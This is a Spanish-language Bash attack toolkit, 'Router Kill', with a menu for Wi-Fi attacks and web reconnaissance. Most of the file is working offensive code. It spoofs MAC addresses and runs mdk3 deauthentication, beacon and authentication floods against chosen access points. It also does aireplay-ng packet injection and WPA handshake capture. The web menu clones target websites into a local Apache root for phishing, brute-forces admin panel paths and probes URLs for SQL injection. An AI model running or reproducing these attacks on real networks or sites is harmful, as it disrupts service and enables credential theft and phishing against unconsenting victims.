
#!/bin/bash

#Author: Facu Salgado https://github.com/bytesalgado/
#instagram: @facukaku021
#twitter: @facukaku021

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

s="s"


#Colores lo q tanto te molestaba crack xd

blanco="\033[1;37m"
violeta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
violeta2="\033[0;35m"
azul="\033[1;34m"
nc="\e[0m"
mon="mon"


function ctrl_c() {
echo -e "$nc($azul*$nc)$verde Presionaste la tecla$rojo CTRL + C$verde Saliendo del Programa.."
sleep 2
checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
#Verification mode monitor and exit
if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi
echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Facu Salgado..$nc"
sleep 1
exit

}


case `dpkg --print-architecture` in
aarch64)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
arm)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
armhf)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;

i*86)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
x86_64)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
esac




#Opciones menu

a=$'\e[1;35mDeauth Atack\e[01;32m'
b=$'\e[1;35mFake Point\e[01;32m'
c=$'\e[1;35mAuth Atttack\e[01;32m'
new=$'\e[1;35mInject Packets\e[01;32m'
d=$'\e[1;35mStop monitor mode\e[01;32m'
e=$'\e[1;35mCapture Handshake\e[01;32m'
new2=$'\e[1;35mWeb Attacks\e[01;32m'
update=$'\e[1;35mUpdate Program\e[01;32m'
f=$'\e[1;35mExit Program\e[01;32m'


#opciones MENU

w1=$'\e[1;35mClonar sitio\e[01;32m'
w2=$'\e[1;35mFind panel\e[01;32m'
w3=$'\e[1;35mCheck SQLI\e[01;32m'
w4=$'\e[1;35mBack menu\e[01;32m'


wyes=$'\e[1;35mClonar Index\e[01;32m'
wno=$'\e[1;35mClonar web entera\e[01;32m'
wback=$'\e[1;35mBack Menu\e[01;32m'

#directory verification
directory=$(pwd)

#verificacion de Dependencias..

#root privilegies
if [[ $EUID -ne 0 ]]; then	

echo -e "$nc($violeta2*$nc)$rojo ERROR:$azul No eres usuario$rojo root"		
exit 1
fi

#airmon-ng
if which airmon-ng >/dev/null; then
sleep 0.25
echo -e "$azul(airmon-ng)$verde Instalado correctamente."
else
sleep 0.25
echo -e "$azul(airmon-ng)$verde NO instalado.."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install aircrack-ng -y"
sleep 0.25
exit 1
fi

if which airodump-ng >/dev/null; then
sleep 0.25
echo -e "$azul(airodump-ng)$verde Instalado correctamente."
else
sleep 0.25
echo -e "$azul(airodump-ng)$verde no Instalado"
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install aircrack-ng -y"
exit 1
fi

if which mdk3 >/dev/null; then
sleep 0.25
echo -e "$azul(MDK3)$verde Instalado correctamente."
sleep 0.25
else
sleep 0.25
echo -e "$azul(MDK3)$verde No instalado."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install mdk3 -y"
exit 1
fi


if which macchanger >/dev/null; then
sleep 0.25
echo -e "$azul(Macchanger)$verde Instalado correctamente."
sleep 0.25
else
sleep 0.25
echo -e "$azul(Macchanger)$verde no instalado."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install macchanger -y"
exit 1
fi

if which toilet >/dev/null; then
sleep 1
echo -e "$azul(Toilet)$verde Instalado correctamente."
else
sleep 1
echo -e "$azul(TOilet)$verde No instalado"
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install toilet -y"
sleep 1
exit 1
fi

#mensaje y logo bienvenida
clear
toilet --filter border Router Kill | lolcat
echo
echo -e "$violeta2(*)$azul Router Kill$rojo v3.0$azul"
sleep 2
echo -e "$violeta2(*)$azul Script creado por$rojo Facu Salgado"
sleep 1
echo -e "$violeta2(*)$azul Regalanos una estrella en github$verde"

export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '




function verificarsqli(){
sleep 1
echo -e "$violeta2(*)$azul Esta funcion le permitira saber si un sitio es vulnerable a$rojo SQL Injection"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Debe ingresar la pagina de la siguiente manera:"
echo -e "$violeta2(*)$azul You need to enter the page as follows:"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo dominio.com$violeta2/pagina.php?parametro=1"
echo -e "$violeta2(*)$azul Example:$rojo domain.com$violeta2/page.php?parameter=1"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Example:$rojo domain.com$violeta2/login.php?id=1"
echo -e "$violeta2(*)$azul Ejemplo:$rojo domain.com$violeta2/login.php?id=1"
sleep 2
echo
echo
printf "\e[01;35m Escriba la pagina:\e[01;32m "
read page
echo
echo -e "$purpura(*)$blue verificando$rojo SQLI VULNERABILITY$azul Please Wait.."
sleep 4


#solicitud GET al sitio
dork="'"
i2=0
sqli=$(curl -H "Accept: application/xml" -H "Content-Type: application/xml" --silent -X GET "$page$dork")

#Verification fallas SQL en la consulta GET

if  echo "$sqli" | grep -q -i "You have an error in your SQL syntax"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysql_fetch_array"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysqli_fetch_array"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysql_num_rows"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "Warning: mysq"; then
i2=$((i2+1))
fi

#Verification Variable C si es mayor a 0 significa que es vulnerable

if [[ $i2 > 0 ]]
then
echo
echo
echo -e "$azul Pagina$violeta2 $page$verde Is vulnerable a$azul SQLI Injection$verde"
else
echo
echo
echo -e "$azul Pagina$violeta2 $page$rojo Is not vulnerable a$azul SQLI Injection$verde"
sleep 2
fi
menu_principal
}





function obtenerpanel(){

#Verifica el archivo de directorios para el ataque

if [ -e $directory/directorys.txt ]
then
echo
else
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/directorys.txt > $directory/directorys.txt
fi
echo -e "$violeta2(*)$azul Debe ingresar la pagina de la siguiente manera:"
echo -e "$violeta2(*)$azul You need to enter the page as follows:"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Ejemplo:$rojo dominio.com"
echo -e "$violeta2(*)$azul Example:$rojo domain.com"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul No debe incluir subdirectorios como por ejemplo:$rojo dominio.com/hola/"
echo -e "$violeta2(*)$azul It should not include subdirectories such as:$rojo domain.com/hello/"
sleep 4
echo
echo
echo -e "$violeta2(*)$azul Tampoco debe incluir ninguna barra diagonal$rojo(/)"
echo -e "$violeta2(*)$azul It also must not include any forward slashes$rojo(/)"
sleep 4
echo
echo
printf "\e[01;35m Escriba la pagina/domain:\e[01;32m "
read pagina

while read line
do


#obtiene codigo de respuesta y lo guarda en la variable result

result=$(curl -s -I "$pagina/$line" | head -n 1 | awk '{print $2}')

#inicia variable en 0
i=0

#si el codigo respuesta es 200 o 302 le suma +1 a la variable

if [[ "$result" == "200" ]]; then
i=$((i+1))
elif [[ "$result" == "302" ]]; then
i=$((i+1))
fi

#si la variable es mayor a 0 significa que el panel fue encontrado.

if [[ $i > 0 ]]
then
echo -e "$azul Pagina$rojo $pagina$violeta2/$line$verde Found"
sleep 2
echo
echo -e "$azul Posible panel de la pagina: $verde$pagina/$line$verde"
sleep 3
echo
echo
break
else
echo -e "$azul Pagina$rojo $pagina$violeta2/$line$rojo Not Found"
fi
done < $directory/directorys.txt
echo -e "$violeta2(*)$azul volviendo al menu principal.."
sleep 3
menu_principal
}

function webmenu(){


select webmenu in "$w1" "$w2" "$w3" "$w4";
do
case $webmenu in
$w1)
echo
echo
echo -e "$violeta2(*)$azul Verificando estado$verde apache2"
sleep 2
#check Apache
if which apache2 >/dev/null; then
sleep 1
echo -e "$azul(apache2)$verde Instalado"
else
sleep 1
echo -e "$azul(apache2)$verde No instalado"
sleep 2
echo -e "$azul(apache2)$verde Instalando apache2 en 5 segundos.."
sleep 5
apt-get install apache2 -y
clear
fi
echo -e "$violeta2(*)$azul A continuacion escoga si desea clonar el index o el sitio entero..$verde"
sleep 3
echo
echo
select tipoclone in "$wyes" "$wno" "$wback";
do 
case $tipoclone in
$wyes)
if [ -e $directory/index.html ]
then
rm $directory/index.html
fi
echo
echo
echo -e "$violeta2(*)$azul A continuacion ingrese el sitio web sin subdominios"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo mipagina.com"
sleep 2
printf "\e[01;35m Escriba el sitio/domain:\e[01;32m "
read targetwebsite
echo -e "$violeta2(*)$azul Clonando Website:$rojo $targetwebsite$azul Please wait.."
sleep 3
curl --silent $targetwebsite >> $directory/index.html
mv $directory/index.html /var/www/html/
sleep 1
echo -e "$violeta2(*)$azul Sitio web:$rojo $targetwebsite$azul Clonado exitosamente..."
sleep 3
echo -e "$violeta2(*)$azul para ver el sitio dirigase a su navegador y coloque$violeta2 http://localhost$verde"
sleep 3
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 2
menu_principal
;;

$wno)
rm -rf /var/www/html/*
sleep 1
echo -e "$violeta2(*)$azul esta opcion clonara el sitio web entero de RAIZ.."
sleep 3
echo
echo
echo -e "$violeta2(*)$azul A continuacion ingrese el sitio web sin subdominios"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo mipagina.com"
sleep 2
printf "\e[01;35m Escriba el sitio/domain:\e[01;32m "
read targetwebsite2
echo -e "$violeta2(*)$azul Clonando Website:$rojo $targetwebsite2$azul Please wait.."
sleep 3
cd /var/www/html
wget -q --header="Accept: text/html" --user-agent="Mozilla/5.0 (X11; Linux amd64; rv:32.0b4) Gecko/20140804164216 ArchLinux KDE Firefox/32.0b4" --referer=http://www.google.com -r $targetwebsite2 -e robots=off -k
cd $directory
echo -e "$violeta2(*)$azul sitio web$rojo $targetwebsite2$azul clonado exitosamente.."
sleep 3
echo -e "$violeta2(*)$azul para ver el sitio dirigase a su navegador y coloque$violeta2 http://localhost$verde"
sleep 3
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 2
menu_principal

;;

$wback)
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 3
menu_principal
;;
*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac
done
;;

$w2)
echo -e "$violeta2(*)$azul Please wait..$verde"
sleep 3
obtenerpanel
;;

$w3)

echo -e "$violeta2(*)$azul Please wait..$verde"
sleep 3
verificarsqli
;;
$w4) 
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde Please wait.."
sleep 3
menu_principal
;;
*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac
done
}


















#menu principal

function menu_principal(){
echo
echo
select menu in "$a" "$b" "$c" "$new" "$d" "$e" "$new2" "$update" "$f";
do
case $menu in 

$a)
echo -e "$nc($azul*$nc)$verde Este Ataque desautenticara todos los clientes dentro de la red"
sleep 2
echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
printf "\e[01;35m Escriba su interface:\e[01;32m "
read interface
#cambio de dirección mac
echo -e "$nc($azul*$nc)$verde A continuacion daremos de baja tu interfaz para falsificar tu MAC"
sleep 2
ifconfig $interface down
echo -e "$nc($azul*$nc)$verde Falsificando tu MAC!!"
sleep 2
macchanger -r $interface
ifconfig $interface up
echo -e "$nc($azul*$nc)$verde TU direccion MAC fue falsificada correctamente!!"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($azul*$nc)$rojo AVISO: Espera 10 segundos$verde cuando inicie el analisis"
sleep 9
timeout --foreground 12s airodump-ng $interface$mon
echo
echo
printf "\e[01;35m Escriba el BSSID de la red:\e[01;32m "
read bssid
printf "\e[01;35m Escriba el canal de la red (CH):\e[01;32m "
read ch
sleep 2
printf "\e[01;35m Escriba el nombre txt para guardar el BSSID:\e[01;32m "
read doc
echo $bssid > $doc
sleep 2
printf "\e[01;35m Añade la duracion del ataque en segundos:\e[01;32m "
read sec
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque sera realizado al BSSID:$azul $bssid $verde En el Canal: $ch"
sleep 2
echo -e "$nc($azul*$nc)$verde el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
sleep 2
airmon-ng stop $interface$mon
menu_principal
;;

$b)


echo -e "$nc($azul*$nc)$verde Este Ataque Creara un flood de redes WIFI"
sleep 2
echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "\e[01;35m Escriba su interfaz:\e[01;32m "
read interface
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
echo
printf "\e[01;35m Escriba tiempo de ataque en segundos:\e[01;32m "
read sec
sleep 2
echo -e "$nc($azul*$nc)$verde el ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($azul*$nc)$rojo ATAQUE INICIADO..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
timeout --foreground $sec$s mdk3 $interface$mon b
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
sleep 2
airmon-ng stop $interface$mon
menu_principal
;;


$c)

echo -e "$nc($azul*$nc)$verde Este Ataque realizara un flood de intentos de conexion al router"
sleep 2
echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "\e[01;35m EScriba su interfaz:\e[01;32m "
read interface
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($azul*$nc)$rojo AVISO: Espera 20 segundos$verde cuando inicie el analisis"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo
printf "\e[01;35m EScribe el BSSID de la red:\e[01;32m "
read bssid
sleep 2
printf "\e[01;35m Escribe un nombre para guardar en txt\e[01;32m "
read doc
echo $bssid > $doc
echo
printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
read ch
printf "\e[01;35m AÑade el ESSID de la red:\e[01;32m "
read essid	
sleep 1
read -p "Añade la duracion del ataque en segundos ➜ " sec
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
sleep 2
timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
sleep 2
airmon-ng stop $interface$mon
menu_principal



;;

$new)

echo -e "$nc($azul*$nc)$verde Este Ataque realizara un flood de intentos de conexion al router"
sleep 2
echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "\e[01;35m su interfaz:\e[01;32m "
read interface
echo -e "$nc($azul*$nc)$verde Modificaremos su direccion MAC"
ifconfig $interface down
macchanger -r $interface
val=$(ifconfig $interface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
echo -e "$nc($azul*$nc)$verde Direccion MAC falsificada"
sleep 2
echo -e "$nc($azul*$nc)$verde Iniciando modo monitor.."
sleep 3
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($azul*$nc)$rojo AVISO: Espera 20 segundos$verde cuando inicie el analisis"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo
printf "\e[01;35m Añade el BSSID de la red:\e[01;32m "
read bssid
echo
printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
read ch
printf "\e[01;35m Añade duracion del ataque en segundos:\e[01;32m "
read sec
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos..."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
sleep 2
timeout --foreground $sec$s xterm -hold -e "airodump-ng --bssid $bssid -c $ch  $interface$mon" & 
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $interface$mon" &
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --arpreplay -b $bssid -h $val $interface$mon"
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$amarillo"
sleep 2
airmon-ng stop $interface$mon
menu_principal


;;

$d)

checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi
echo -e "$nc($azul*$nc)$verde Volviendo al menu principal$verde"
sleep 2
menu_principal

;;

$e)

echo -e "$nc($azul*$nc)$verde Este Ataque capturara un handshake de una RED"
sleep 2
echo -e "$nc($azul*$nc)$verde Les mostraremos sus interfaces disponibles"
sleep 2
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "\e[01;35m Escriba su interfaz:\e[01;32m "
read interface
echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($azul*$nc)$verde AVISO: Espera 25 segundos$verde cuando inicie el analisis"
sleep 9
timeout --foreground 25s airodump-ng $interface$mon
echo
echo
printf "\e[01;35m Añade el BSSID victima:\e[01;32m "
read bssid
sleep 2
printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
read ch
sleep 2
printf "\e[01;35m Añade el un nombre para guardar el txt:\e[01;32m "
read doc
echo $bssid > $doc
sleep 2
read -p "Añade la duracion del ataque(deauth) en segundos ➜ " sec
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque sera realizado al BSSID:$azul $bssid $verde En el Canal: $ch"
sleep 2
echo -e "$nc($azul*$nc)$verde el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
echo -e "$nc($azul*$nc)$verde ejecutando xterm en 5 segundos.."
sleep 5
timeout --foreground 30s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon" & 
timeout --foreground 60s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" 
echo -e "$nc($azul*$nc)$verde El handshake fue capturado exitosamente PATH:$azul handshake/$doc.cap"
sleep 4
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
sleep 2
airmon-ng stop $interface$mon
menu_principal



;;

$new2)
echo -e "$nc($azul*$nc)$verde Please wait.."
sleep 3
echo
echo
webmenu

;;

$update)

echo -e "$nc($azul*$nc)$verde Comprobando estado internet.. please wait.."
sleep 4
if ping -q -w 1 -c 1 google.com > /dev/null; then
echo -e "$nc($azul*$nc)$verde Actualizando programa.. en 5 segundos.."
sleep 5 
if [ -e $directory/routerkill.sh ]
then
rm $directory/routerkill.sh
fi
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/routerkill.sh > routerkill.sh
echo -e "$nc($azul*$nc)$verde Programa Actualizado.. vuelva a ejecutarlo nuevamente..$nc"
sleep 2
exit                                                                                                                                                                
else 
echo
echo
echo -e "$nc($azul*$nc)$verde Internet no disponible.. saliendo..$nc" 
exit                                                                                                                                                              
fi       
;;
$f)

checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi
echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Facu Salgado..$nc"
sleep 2
exit
;;


*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac 
done
}
menu_principal
